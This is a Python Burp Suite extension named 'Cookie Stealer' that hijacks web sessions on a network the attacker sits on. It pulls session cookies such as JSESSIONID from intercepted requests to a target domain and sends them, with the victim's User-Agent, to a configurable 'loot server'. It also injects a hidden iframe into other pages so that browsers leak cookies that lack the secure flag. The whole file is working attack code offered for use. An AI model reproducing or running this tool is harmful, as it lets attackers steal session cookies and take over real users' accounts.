# Configuration
LOOT_SERVER_NAME = "<PLACEHOLDER_LOOT_SERVER>"
LOOT_SERVER_PORT = 443
LOOT_SERVER_PROTOCOL = "https"
LOOT_SERVER_API_TOKEN = "<PLACEHOLDER_API_TOKEN>"
ATTACKED_DOMAIN = "example.org"
ATTACKED_COOKIE_NAMES = ["JSESSIONID", "other"]
# End configuration

import re
import urllib
from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpService


class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        print "Extension loaded!"
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Cookie Stealer (for cookies with missing secure flag)")
        callbacks.registerHttpListener(self)
        self._all_cookies = set([])
        self._end_html_regex = re.compile("</head>\s*<body.*?>")
        self._cookie_regex = [re.compile(cookie_name + "=([^;, ]*);?") for cookie_name in ATTACKED_COOKIE_NAMES]
        print "Extension registered!"

    def processHttpMessage(self, toolFlag, messageIsRequest, baseRequestResponse):
        iRequest = self._helpers.analyzeRequest(baseRequestResponse)
        if messageIsRequest:
            # In requests we check if it is from one of the domains we want to attack
            if ATTACKED_DOMAIN in str(iRequest.getUrl()):
                print "Found a request that has %s in its URL..." % ATTACKED_DOMAIN
                headers = iRequest.getHeaders()
                cookies = []
                useragent = ""

                for i in headers:
                    if i.startswith("Cookie"):
                        matches = [regex.search(i) for regex in self._cookie_regex]
                        matches_cookies = zip(ATTACKED_COOKIE_NAMES, matches)
                        cookies = [(cookie_name, match.group(1)) for cookie_name, match in matches_cookies if match]
                    if i.startswith("User-Agent"):
                        useragent = i

                if len(cookies) == 0:
                    return

                url = "/cookiedealer/data.php?token=" + LOOT_SERVER_API_TOKEN
                for index, cookie in enumerate(cookies):
                    cookie_name, cookie_value = cookie
                    print "Found a request that has a %s cookie in it!" % cookie_name
                    if cookie_name in self._all_cookies:
                        print "Cookie was already sent to the server before..."  # , not sending again!"
                        continue
                    self._all_cookies.add(cookie_name)
                    description = "Useragent: " + useragent + "\n"
                    description += "Originally stolen from a request to: " + str(iRequest.getUrl()) + "\n"
                    url += "&domain[" + str(index) + "]=" + ATTACKED_DOMAIN
                    url += "&name[" + str(index) + "]=" + cookie_name
                    url += "&value[" + str(index) + "]=" + urllib.quote_plus(cookie_value)
                    url += "&description=" + urllib.quote_plus(description)

                leak_req = """GET """ + url + """ HTTP/1.1
Host: %s:%s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: close

""".replace("\n", "\r\n") % (LOOT_SERVER_NAME, str(LOOT_SERVER_PORT))
                print "Sending cookies to loot server!"
                self._callbacks.makeHttpRequest(SbahnService(), leak_req).getResponse()

        elif ATTACKED_DOMAIN not in str(iRequest.getUrl()):
            # In responses we inject an iframe, only in requests that are not already to ATTACKED_DOMAIN
            response = jb2ps(baseRequestResponse.getResponse())
            if self._end_html_regex.search(response):
                print "Found a matching HTML page that has the </head> and <body ...> in it."
                iResponse = self._helpers.analyzeResponse(baseRequestResponse.getResponse())
                header, body = response[:iResponse.getBodyOffset()], response[iResponse.getBodyOffset():]
                body = re.sub(self._end_html_regex,
                              '\g<0><iframe src="http://' + ATTACKED_DOMAIN + '" style="display:none;" width="1px" height="1px"></iframe>',
                              body)
                header = fix_content_length(header, len(body), "\r\n")
                baseRequestResponse.setResponse(header + body)


def fix_content_length(headers, length, newline):
    h = list(headers.split(newline))
    for index, x in enumerate(h):
        if "content-length:" == x[:len("content-length:")].lower():
            h[index] = x[:len("content-length:")] + " " + str(length)
            return newline.join(h)
    else:
        print "WARNING: Couldn't find Content-Length header in request, simply adding this header"
        h.insert(1, "Content-Length: " + str(length))
        return newline.join(h)


class SbahnService(IHttpService):
    def getHost(self):
        return LOOT_SERVER_NAME

    def getPort(self):
        return LOOT_SERVER_PORT

    def getProtocol(self):
        return LOOT_SERVER_PROTOCOL


def jb2ps(arr):
    return ''.join(map(lambda x: chr(x % 256), arr))
